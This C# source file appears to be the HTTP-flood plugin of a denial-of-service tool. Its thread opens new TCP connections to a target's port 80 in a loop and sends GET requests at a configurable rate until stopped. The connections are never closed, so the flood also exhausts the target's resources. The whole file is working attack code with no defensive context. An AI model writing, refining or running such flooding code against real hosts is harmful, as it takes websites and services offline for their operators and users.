using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Noah.Attacks
{
    public class HTTPAttackPlugin : IAttack
    {
        public Thread AttackThread { get; private set; }
        public string AttackName { get; private set; }

        private string message;
        private ApplicationState state;
        private string ip;

        public HTTPAttackPlugin(string host, ApplicationState state)
        {
            StringBuilder sb = new StringBuilder("GET ");
            sb.Append(host);
            sb.AppendLine(" HTTP/1.1");

            message = sb.ToString();
            this.state = state;
            ip = host;
            AttackThread = new Thread(() => attack());
        }

        public void BeginAttack()
        {
            AttackThread.Start();
        }

        private void attack()
        {
            state.State = States.Attacking;

            while (state.State != States.Done)
            {
                TcpClient client = new TcpClient(IPAddress.Parse(ip).ToString(), 80);
                StreamWriter output = new StreamWriter(client.GetStream());
                output.WriteLine(message);
                output.Flush();
                Thread.Sleep(state.Delay);

                if (state.StopWatch.ElapsedMilliseconds % 1000 == 0 && state.ShowTime)
                    Console.WriteLine(state.StopWatch.Elapsed.Seconds);
            }
        }
    }
}